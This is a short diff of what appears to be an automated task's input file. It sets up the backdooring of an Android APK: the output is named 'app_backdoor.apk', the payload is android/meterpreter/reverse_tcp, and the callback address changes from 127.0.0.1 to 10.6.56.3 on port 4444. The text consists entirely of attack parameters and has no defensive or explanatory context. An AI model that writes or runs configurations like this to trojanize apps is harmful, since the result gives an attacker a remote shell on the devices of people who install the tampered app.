@@ -1,5 +1,5 @@
-/workspace/tasks/20250809/a8643317-android/input/original.apk
-/workspace/tasks/20250809/a8643317-android/output/app_backdoor.apk
+/workspace/tasks/20250809/a4c2f33b-android/input/original.apk
+/workspace/tasks/20250809/a4c2f33b-android/output/app_backdoor.apk
 android/meterpreter/reverse_tcp
-127.0.0.1
+10.6.56.3
 4444
